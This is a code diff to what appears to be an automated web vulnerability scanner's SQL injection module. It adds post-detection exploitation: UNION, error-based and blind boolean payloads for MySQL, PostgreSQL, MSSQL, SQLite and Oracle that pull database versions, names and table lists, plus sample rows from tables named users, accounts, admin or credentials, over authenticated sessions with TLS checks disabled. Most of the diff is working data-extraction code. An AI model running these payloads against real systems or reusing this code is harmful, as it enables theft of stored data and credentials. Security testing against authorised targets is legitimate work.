@@ -322,7 +322,11 @@ class SQLiEvidence:
     boolean_diffs: list[dict] = field(default_factory=list)
     cross_validations: list[str] = field(default_factory=list)
     confidence_factors: dict[str, int] = field(default_factory=dict)
-    
+    # Data extraction results (real exploitation proof)
+    extracted_data: dict[str, Any] = field(default_factory=dict)
+    num_columns: int = 0  # UNION column count
+    display_column: int = -1  # Which column shows output
+
     def total_confidence(self) -> int:
         """Calculate total confidence from all factors."""
         if not self.confidence_factors:
@@ -354,10 +358,24 @@ class SQLiEvidence:
         
         if self.cross_validations:
             evidence.append(f"Cross-Validated: {', '.join(self.cross_validations)}")
-        
+
+        # Real exploitation data
+        if self.extracted_data:
+            ed = self.extracted_data
+            if ed.get("db_version"):
+                evidence.append(f"DB Version (extracted): {ed['db_version']}")
+            if ed.get("current_db"):
+                evidence.append(f"Current Database: {ed['current_db']}")
+            if ed.get("tables"):
+                evidence.append(f"Tables Found: {', '.join(ed['tables'][:10])}")
+            if ed.get("sample_data"):
+                evidence.append(f"Sample Data Extracted: {len(ed['sample_data'])} rows")
+                for row in ed["sample_data"][:3]:
+                    evidence.append(f"  → {row}")
+
         evidence.append(f"Confidence Factors: {self.confidence_factors}")
         evidence.append(f"Total Confidence: {self.total_confidence()}%")
-        
+
         return evidence
 
 
@@ -1133,6 +1151,14 @@ class SQLiScanner(ScanModule):
         endpoints = asset_data.get("endpoints", [])
         forms = asset_data.get("forms", [])
 
+        # AUTH CONTEXT: Use authentication for testing protected endpoints
+        auth_context = asset_data.get("auth_context")
+        if auth_context and hasattr(auth_context, "auth_headers") and auth_context.auth_headers:
+            self._auth_headers = auth_context.auth_headers
+            logger.info(f"[SQLi] Using authenticated session ({auth_context.method})")
+        else:
+            self._auth_headers = {}
+
         # ENHANCEMENT: Get parameters discovered by arjun for targeted testing
         tool_discovered_params = asset_data.get("tool_discovered_params", {})
         if tool_discovered_params:
@@ -1140,7 +1166,22 @@ class SQLiScanner(ScanModule):
 
         # Get shared findings store for inter-module communication
         shared_store = asset_data.get("shared_findings_store")
-        
+
+        # CROSS-MODULE TARGETING: Add endpoints where other modules found vulns
+        # If XSS/NoSQL/SSTI found a vulnerable parameter, it accepts user input → test for SQLi too
+        if shared_store:
+            from utils.shared_findings_store import VulnType
+            existing_urls = {e.split("?")[0] if "?" in e else e for e in endpoints}
+            cross_module_types = [VulnType.XSS, VulnType.NOSQL_INJECTION, VulnType.SSTI, VulnType.COMMAND_INJECTION]
+            for vtype in cross_module_types:
+                for sf in shared_store.get_findings_by_type(vtype):
+                    if sf.endpoint and sf.endpoint not in existing_urls:
+                        url = sf.endpoint
+                        if sf.parameter:
+                            url = f"{sf.endpoint}?{sf.parameter}=1"
+                        endpoints.append(url)
+                        logger.debug(f"[SQLi] Cross-module target added from {sf.module}: {url}")
+
         # Test URL parameters
         for endpoint in endpoints:
             await rate_limiter.acquire(host)
@@ -1642,6 +1683,7 @@ class SQLiScanner(ScanModule):
                 confirmed_methods.append("time_blind")
         
         # 4. Test UNION-based
+        union_num_columns = 0
         if "error_based" in confirmed_methods or len(confirmed_methods) >= 1:
             union_result = await self._test_union_based_advanced(
                 base_url, param_name, params, cluster, ctx
@@ -1650,29 +1692,37 @@ class SQLiScanner(ScanModule):
                 evidence.cross_validations.append("union_based")
                 evidence.confidence_factors["union_based"] = 25
                 confirmed_methods.append("union_based")
-        
+                union_num_columns = union_result.num_columns
+                evidence.num_columns = union_num_columns
+
         # Calculate final confidence
         if not confirmed_methods:
             return None
-        
+
         # Cross-validation bonus
         if len(confirmed_methods) >= 2:
             evidence.confidence_factors["cross_validation"] = 20
         if len(confirmed_methods) >= 3:
             evidence.confidence_factors["triple_confirmation"] = 15
-        
+
         # Anomaly detection bonus
         anomaly_boost = detector.get_confidence_boost(
             evidence.injected_fingerprint or cluster.centroid
         )
         if anomaly_boost > 0:
             evidence.confidence_factors["anomaly_detection"] = min(anomaly_boost, 15)
-        
+
+        # 5. POST-DETECTION DATA EXTRACTION (real exploitation proof)
+        await self._run_post_detection_extraction(
+            base_url, param_name, params, evidence,
+            confirmed_methods, num_columns=union_num_columns,
+        )
+
         total_confidence = evidence.total_confidence()
-        
+
         # Log confidence for debugging
         logger.info(f"📊 SQLi confidence for {param_name}: {total_confidence}% (methods: {confirmed_methods}, factors: {evidence.confidence_factors})")
-        
+
         return SQLiResult(
             is_vulnerable=total_confidence >= self.MIN_CONFIDENCE,
             confidence=total_confidence,
@@ -2092,6 +2142,7 @@ class SQLiScanner(ScanModule):
                                     detection_method=DetectionMethod.UNION_BASED,
                                     payload=payload,
                                     mutated_payloads=[mutated_payload] if mutated_payload != payload else [],
+                                    num_columns=num_columns,
                                 )
                                 return evidence
                                 
@@ -2142,7 +2193,415 @@ class SQLiScanner(ScanModule):
                     high = mid - 1
         
         return result
-    
+
+    # =============================================================================
+    # DATA EXTRACTION METHODS (Real exploitation proof)
+    # =============================================================================
+
+    async def _extract_data_union(
+        self,
+        base_url: str,
+        param_name: str,
+        params: dict[str, list[str]],
+        num_columns: int,
+        evidence: SQLiEvidence,
+    ) -> dict[str, Any]:
+        """UNION-based data extraction: version, DB name, tables, sample data."""
+        extracted: dict[str, Any] = {}
+        if num_columns == 0:
+            return extracted
+
+        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
+            # Step 1: Find displayable column (replace NULLs with marker one at a time)
+            marker = f"PHANTOM_{random.randint(100000, 999999)}"
+            display_col = -1
+            columns_list = ["NULL"] * num_columns
+
+            for i in range(num_columns):
+                test_cols = columns_list.copy()
+                test_cols[i] = f"'{marker}'"
+                cols_str = ",".join(test_cols)
+                payload = f"' UNION SELECT {cols_str}--"
+
+                test_params = params.copy()
+                original = test_params[param_name][0] if test_params[param_name] else ""
+                test_params[param_name] = [original + payload]
+                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                try:
+                    resp = await client.get(test_url)
+                    if resp.status_code == 200 and marker in resp.text:
+                        display_col = i
+                        break
+                except Exception:
+                    continue
+
+            if display_col == -1:
+                return extracted
+
+            evidence.display_column = display_col
+
+            # Helper: inject a SQL expression in the display column
+            async def _union_extract(sql_expr: str) -> str | None:
+                test_cols = ["NULL"] * num_columns
+                test_cols[display_col] = sql_expr
+                cols_str = ",".join(test_cols)
+                payload = f"' UNION SELECT {cols_str}--"
+                test_params = params.copy()
+                original = test_params[param_name][0] if test_params[param_name] else ""
+                test_params[param_name] = [original + payload]
+                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+                try:
+                    resp = await client.get(test_url)
+                    if resp.status_code == 200:
+                        return resp.text
+                except Exception:
+                    return None
+                return None
+
+            # Step 2: Extract DB version
+            db = evidence.db_type
+            version_exprs = {
+                DatabaseType.MYSQL: "@@version",
+                DatabaseType.POSTGRESQL: "version()",
+                DatabaseType.MSSQL: "@@version",
+                DatabaseType.SQLITE: "sqlite_version()",
+                DatabaseType.ORACLE: "banner FROM v$version WHERE ROWNUM=1--",
+            }
+            version_expr = version_exprs.get(db, "@@version")
+
+            # Use concat with markers for extraction
+            extract_marker_l = f"PHXL{random.randint(1000,9999)}"
+            extract_marker_r = f"PHXR{random.randint(1000,9999)}"
+
+            if db == DatabaseType.ORACLE:
+                ver_sql = f"'{extract_marker_l}'||({version_expr})||'{extract_marker_r}'"
+            elif db == DatabaseType.MSSQL:
+                ver_sql = f"'{extract_marker_l}'+CAST({version_expr} AS VARCHAR(200))+'{extract_marker_r}'"
+            else:
+                ver_sql = f"CONCAT('{extract_marker_l}',{version_expr},'{extract_marker_r}')"
+
+            resp_text = await _union_extract(ver_sql)
+            if resp_text and extract_marker_l in resp_text:
+                start = resp_text.index(extract_marker_l) + len(extract_marker_l)
+                end = resp_text.index(extract_marker_r, start)
+                extracted["db_version"] = resp_text[start:end].strip()[:200]
+                evidence.db_version = extracted["db_version"]
+                logger.info(f"[SQLi] Extracted DB version: {extracted['db_version']}")
+
+            # Step 3: Extract current database name
+            db_name_exprs = {
+                DatabaseType.MYSQL: "database()",
+                DatabaseType.POSTGRESQL: "current_database()",
+                DatabaseType.MSSQL: "DB_NAME()",
+                DatabaseType.SQLITE: "'main'",
+                DatabaseType.ORACLE: "SYS_CONTEXT('USERENV','DB_NAME')",
+            }
+            db_name_expr = db_name_exprs.get(db, "database()")
+            db_sql = f"CONCAT('{extract_marker_l}',{db_name_expr},'{extract_marker_r}')"
+            if db in (DatabaseType.ORACLE,):
+                db_sql = f"'{extract_marker_l}'||{db_name_expr}||'{extract_marker_r}'"
+            elif db == DatabaseType.MSSQL:
+                db_sql = f"'{extract_marker_l}'+{db_name_expr}+'{extract_marker_r}'"
+
+            resp_text = await _union_extract(db_sql)
+            if resp_text and extract_marker_l in resp_text:
+                start = resp_text.index(extract_marker_l) + len(extract_marker_l)
+                end = resp_text.index(extract_marker_r, start)
+                extracted["current_db"] = resp_text[start:end].strip()[:100]
+                logger.info(f"[SQLi] Extracted current DB: {extracted['current_db']}")
+
+            # Step 4: Extract table names (first 10)
+            table_queries = {
+                DatabaseType.MYSQL: "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()--",
+                DatabaseType.POSTGRESQL: "STRING_AGG(table_name,',') FROM information_schema.tables WHERE table_schema='public'--",
+                DatabaseType.SQLITE: "GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table'--",
+                DatabaseType.MSSQL: "STRING_AGG(table_name,',') FROM information_schema.tables--",
+            }
+
+            if db in table_queries:
+                table_q = table_queries[db]
+                # Build full payload: ' UNION SELECT NULL,...,CONCAT(marker,query,marker),...-- FROM ...
+                # The query part goes after the column selection
+                test_cols = ["NULL"] * num_columns
+                test_cols[display_col] = f"CONCAT('{extract_marker_l}',({table_q.split('FROM')[0].strip()}),'{extract_marker_r}')"
+                from_clause = "FROM " + "FROM".join(table_q.split("FROM")[1:]) if "FROM" in table_q else ""
+                cols_str = ",".join(test_cols)
+                payload = f"' UNION SELECT {cols_str} {from_clause}"
+
+                test_params = params.copy()
+                original = test_params[param_name][0] if test_params[param_name] else ""
+                test_params[param_name] = [original + payload]
+                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                try:
+                    resp = await client.get(test_url)
+                    if resp.status_code == 200 and extract_marker_l in resp.text:
+                        start = resp.text.index(extract_marker_l) + len(extract_marker_l)
+                        end = resp.text.index(extract_marker_r, start)
+                        tables_str = resp.text[start:end].strip()
+                        if tables_str:
+                            extracted["tables"] = [t.strip() for t in tables_str.split(",") if t.strip()][:20]
+                            logger.info(f"[SQLi] Extracted {len(extracted['tables'])} tables: {extracted['tables'][:5]}")
+                except Exception as e:
+                    logger.debug(f"[SQLi] Table extraction failed: {e}")
+
+            # Step 5: Extract sample data from interesting tables
+            interesting = ["users", "accounts", "admin", "credentials", "members", "login"]
+            target_table = None
+            for t in interesting:
+                if any(t in tbl.lower() for tbl in extracted.get("tables", [])):
+                    target_table = next(tbl for tbl in extracted["tables"] if t in tbl.lower())
+                    break
+            if not target_table and extracted.get("tables"):
+                target_table = extracted["tables"][0]
+
+            if target_table:
+                # Simpler approach: just get first row concatenated
+                if db == DatabaseType.SQLITE:
+                    row_sql = f"'{extract_marker_l}'||GROUP_CONCAT(*)|| '{extract_marker_r}' FROM {target_table} LIMIT 3--"
+                elif db == DatabaseType.MYSQL:
+                    row_sql = f"CONCAT('{extract_marker_l}',GROUP_CONCAT(CONCAT_WS(':',*) SEPARATOR '||'),'{extract_marker_r}') FROM {target_table} LIMIT 3--"
+                else:
+                    row_sql = None
+
+                if row_sql:
+                    test_cols2 = ["NULL"] * num_columns
+                    from_part = "FROM " + "FROM".join(row_sql.split("FROM")[1:]) if "FROM" in row_sql else ""
+                    select_part = row_sql.split("FROM")[0].strip()
+                    test_cols2[display_col] = select_part
+                    cols_str2 = ",".join(test_cols2)
+                    payload2 = f"' UNION SELECT {cols_str2} {from_part}"
+
+                    test_params2 = params.copy()
+                    original2 = test_params2[param_name][0] if test_params2[param_name] else ""
+                    test_params2[param_name] = [original2 + payload2]
+                    test_url2 = f"{base_url}?{urlencode(test_params2, doseq=True)}"
+
+                    try:
+                        resp2 = await client.get(test_url2)
+                        if resp2.status_code == 200 and extract_marker_l in resp2.text:
+                            s2 = resp2.text.index(extract_marker_l) + len(extract_marker_l)
+                            e2 = resp2.text.index(extract_marker_r, s2)
+                            raw = resp2.text[s2:e2].strip()
+                            if raw:
+                                extracted["sample_data"] = raw.split("||")[:5]
+                                extracted["sample_table"] = target_table
+                                logger.info(f"[SQLi] Extracted {len(extracted['sample_data'])} sample rows from {target_table}")
+                    except Exception:
+                        pass
+
+        return extracted
+
+    async def _extract_data_blind_boolean(
+        self,
+        base_url: str,
+        param_name: str,
+        params: dict[str, list[str]],
+        evidence: SQLiEvidence,
+    ) -> dict[str, Any]:
+        """Blind boolean-based data extraction: version string char by char."""
+        extracted: dict[str, Any] = {}
+        db = evidence.db_type
+
+        version_funcs = {
+            DatabaseType.MYSQL: "@@version",
+            DatabaseType.POSTGRESQL: "version()",
+            DatabaseType.SQLITE: "sqlite_version()",
+            DatabaseType.MSSQL: "@@version",
+        }
+        version_func = version_funcs.get(db, "@@version")
+
+        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
+            # Extract version string char-by-char using binary search
+            version_str = ""
+            max_chars = 30  # Limit extraction to 30 chars for speed
+
+            for pos in range(1, max_chars + 1):
+                # Binary search for character ASCII value
+                low, high = 32, 126
+                found_char = None
+
+                while low <= high:
+                    mid = (low + high) // 2
+                    # Test: SUBSTRING(version(),pos,1) > CHAR(mid)
+                    payload_gt = f"' AND ASCII(SUBSTRING({version_func},{pos},1))>{mid}--"
+
+                    test_params = params.copy()
+                    original = test_params[param_name][0] if test_params[param_name] else ""
+                    test_params[param_name] = [original + payload_gt]
+                    test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                    try:
+                        resp = await client.get(test_url)
+                        # Compare with baseline - if "true" condition matches normal behavior
+                        is_true = self._blind_response_is_true(resp, evidence)
+
+                        if is_true:
+                            low = mid + 1
+                        else:
+                            high = mid - 1
+                    except Exception:
+                        break
+
+                if low > 126:
+                    break  # No valid char = end of string
+                found_char = chr(low)
+                if found_char and ord(found_char) > 31:
+                    version_str += found_char
+                else:
+                    break
+
+            if version_str:
+                extracted["db_version"] = version_str
+                evidence.db_version = version_str
+                logger.info(f"[SQLi] Blind-extracted DB version: {version_str}")
+
+        return extracted
+
+    def _blind_response_is_true(self, resp: httpx.Response, evidence: SQLiEvidence) -> bool:
+        """Determine if blind boolean response indicates TRUE condition."""
+        if evidence.baseline_fingerprint:
+            baseline_len = evidence.baseline_fingerprint.content_length
+            resp_len = len(resp.text)
+            # True condition should be similar to baseline (normal page)
+            # False condition should differ significantly
+            if baseline_len > 0:
+                ratio = resp_len / baseline_len
+                return 0.8 < ratio < 1.2
+        # Fallback: 200 = true
+        return resp.status_code == 200
+
+    async def _extract_data_error_based(
+        self,
+        base_url: str,
+        param_name: str,
+        params: dict[str, list[str]],
+        evidence: SQLiEvidence,
+    ) -> dict[str, Any]:
+        """Error-based data extraction: parse real data from error messages."""
+        extracted: dict[str, Any] = {}
+        db = evidence.db_type
+
+        async with httpx.AsyncClient(timeout=self.timeout, verify=False, http2=True) as client:
+            # DB-specific error-based extraction payloads
+            error_extract_payloads = []
+            if db == DatabaseType.MYSQL:
+                error_extract_payloads = [
+                    ("version", "' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version,0x7e))--"),
+                    ("current_db", "' AND EXTRACTVALUE(1,CONCAT(0x7e,database(),0x7e))--"),
+                    ("tables", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))--"),
+                    ("version_alt", "' AND UPDATEXML(1,CONCAT(0x7e,@@version,0x7e),1)--"),
+                    ("current_db_alt", "' AND UPDATEXML(1,CONCAT(0x7e,database(),0x7e),1)--"),
+                ]
+            elif db == DatabaseType.POSTGRESQL:
+                error_extract_payloads = [
+                    ("version", "' AND 1=CAST(version() AS INT)--"),
+                    ("current_db", "' AND 1=CAST(current_database() AS INT)--"),
+                    ("tables", "' AND 1=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public') AS INT)--"),
+                ]
+            elif db == DatabaseType.MSSQL:
+                error_extract_payloads = [
+                    ("version", "' AND 1=CONVERT(INT,@@version)--"),
+                    ("current_db", "' AND 1=CONVERT(INT,DB_NAME())--"),
+                    ("tables", "' AND 1=CONVERT(INT,(SELECT STRING_AGG(table_name,',') FROM information_schema.tables))--"),
+                ]
+            elif db == DatabaseType.SQLITE:
+                error_extract_payloads = [
+                    ("version", "' AND 1=CAST(sqlite_version() AS INT)--"),
+                    ("tables", "' AND 1=CAST((SELECT GROUP_CONCAT(name,',') FROM sqlite_master WHERE type='table') AS INT)--"),
+                ]
+
+            for data_type, payload in error_extract_payloads:
+                test_params = params.copy()
+                original = test_params[param_name][0] if test_params[param_name] else ""
+                test_params[param_name] = [original + payload]
+                test_url = f"{base_url}?{urlencode(test_params, doseq=True)}"
+
+                try:
+                    resp = await client.get(test_url)
+                    text = resp.text
+
+                    # Parse data from error messages
+                    # MySQL EXTRACTVALUE/UPDATEXML errors: "XPATH syntax error: '~data~'"
+                    tilde_match = re.search(r'~([^~]+)~', text)
+                    if tilde_match:
+                        value = tilde_match.group(1).strip()
+                        if data_type in ("version", "version_alt") and value:
+                            extracted["db_version"] = value[:200]
+                            evidence.db_version = value[:200]
+                        elif data_type in ("current_db", "current_db_alt") and value:
+                            extracted["current_db"] = value[:100]
+                        elif data_type == "tables" and value:
+                            extracted["tables"] = [t.strip() for t in value.split(",") if t.strip()][:20]
+                        continue
+
+                    # PostgreSQL/MSSQL: "invalid input syntax for integer: 'actual_data'"
+                    cast_match = re.search(r"(?:invalid input syntax|conversion failed|cannot convert).*?['\"]([^'\"]+)['\"]", text, re.IGNORECASE)
+                    if cast_match:
+                        value = cast_match.group(1).strip()
+                        if data_type == "version" and value:
+                            extracted["db_version"] = value[:200]
+                            evidence.db_version = value[:200]
+                        elif data_type == "current_db" and value:
+                            extracted["current_db"] = value[:100]
+                        elif data_type == "tables" and value:
+                            extracted["tables"] = [t.strip() for t in value.split(",") if t.strip()][:20]
+
+                except Exception as e:
+                    logger.debug(f"[SQLi] Error extraction ({data_type}): {e}")
+
+        if extracted:
+            logger.info(f"[SQLi] Error-based extraction got: {list(extracted.keys())}")
+        return extracted
+
+    async def _run_post_detection_extraction(
+        self,
+        base_url: str,
+        param_name: str,
+        params: dict[str, list[str]],
+        evidence: SQLiEvidence,
+        confirmed_methods: list[str],
+        num_columns: int = 0,
+    ) -> None:
+        """Run data extraction after SQLi is confirmed. Updates evidence in-place."""
+        try:
+            extracted: dict[str, Any] = {}
+
+            # Try UNION extraction first (most data)
+            if "union_based" in confirmed_methods and num_columns > 0:
+                extracted = await self._extract_data_union(
+                    base_url, param_name, params, num_columns, evidence
+                )
+
+            # Try error-based extraction
+            if not extracted.get("db_version") and "error_based" in confirmed_methods:
+                error_data = await self._extract_data_error_based(
+                    base_url, param_name, params, evidence
+                )
+                for k, v in error_data.items():
+                    if k not in extracted:
+                        extracted[k] = v
+
+            # Try blind extraction (slowest — only for version)
+            if not extracted.get("db_version") and "boolean_blind" in confirmed_methods:
+                blind_data = await self._extract_data_blind_boolean(
+                    base_url, param_name, params, evidence
+                )
+                for k, v in blind_data.items():
+                    if k not in extracted:
+                        extracted[k] = v
+
+            evidence.extracted_data = extracted
+
+            if extracted:
+                # Boost confidence when real data is extracted
+                evidence.confidence_factors["data_extracted"] = 15
+                logger.info(f"[SQLi] Post-detection extraction: {list(extracted.keys())}")
+
+        except Exception as e:
+            logger.debug(f"[SQLi] Post-detection extraction failed: {e}")
+
     async def _test_form_godmode(
         self,
         host: str,
@@ -2156,7 +2615,8 @@ class SQLiScanner(ScanModule):
         inputs = form.get("inputs", [])
         
         if not action.startswith("http"):
-            action = f"https://{host}{action}" if action.startswith("/") else f"https://{host}/{action}"
+            base_url = host if host.startswith("http") else f"https://{host}"
+            action = f"{base_url}{action}" if action.startswith("/") else f"{base_url}/{action}"
         
         form_data = {inp.get("name", ""): inp.get("value", "") for inp in inputs if inp.get("name")}
         
@@ -2460,6 +2920,18 @@ class SQLiScanner(ScanModule):
         if evidence.mutated_payloads:
             working_payload = evidence.mutated_payloads[0]  # Use first successful mutation
 
+        # Use real extracted data if available, otherwise indicate detection-only
+        real_extracted = []
+        if evidence.extracted_data:
+            if evidence.extracted_data.get("tables"):
+                real_extracted = evidence.extracted_data["tables"][:10]
+            if evidence.extracted_data.get("db_version"):
+                real_extracted.insert(0, f"DB version: {evidence.extracted_data['db_version']}")
+            if evidence.extracted_data.get("current_db"):
+                real_extracted.insert(0, f"Database: {evidence.extracted_data['current_db']}")
+        if not real_extracted:
+            real_extracted = ["(detection only — extraction not attempted or target did not respond)"]
+
         # Generate POC
         poc = exploitation_helper.generate_sqli_poc(
             url=ctx.endpoint,
@@ -2467,7 +2939,7 @@ class SQLiScanner(ScanModule):
             payload=working_payload,
             db_type=db_name,
             injection_point=injection_point,
-            data_extracted=["users", "credentials", "sensitive_data"],
+            data_extracted=real_extracted,
             response_evidence=str(evidence.baseline_fingerprint)[:200] if evidence.baseline_fingerprint else "",
         )
 
@@ -2502,6 +2974,7 @@ class SQLiScanner(ScanModule):
                 "waf_detected": evidence.waf_detected.value if evidence.waf_detected != WAFType.NONE else None,
                 "waf_bypassed": evidence.waf_bypassed,
                 "cross_validations": evidence.cross_validations,
+                "extracted_data": evidence.extracted_data if evidence.extracted_data else None,
             },
         )
 
